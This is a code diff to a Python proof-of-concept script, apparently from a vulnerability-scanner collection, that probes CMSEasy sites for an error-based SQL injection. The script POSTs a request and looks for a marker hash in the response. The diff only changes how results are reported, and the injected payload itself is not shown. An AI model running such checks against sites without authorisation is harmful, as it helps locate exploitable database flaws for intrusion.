@@ -10,8 +10,8 @@ description: 文件/coupon/s.php中,参数fids存在SQL注入。
 import sys
 import json
 import requests
-import warnings
-from termcolor import cprint
+
+
 
 class cmseasy_header_detail_sqli_BaseVerify:
     def __init__(self, url):
@@ -30,12 +30,12 @@ class cmseasy_header_detail_sqli_BaseVerify:
         try:
             req = requests.post(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
             if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
-                cprint("[+]存在cmseasy header.php 报错注入漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps(post_data, indent=4), "red")
+                return "[+]存在cmseasy header.php 报错注入漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps(post_data, indent=4)
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            return "[-]connect timeout"
 
 if __name__ == "__main__":
-    warnings.filterwarnings("ignore")
+
     testVuln = cmseasy_header_detail_sqli_BaseVerify(sys.argv[1])
     testVuln.run()
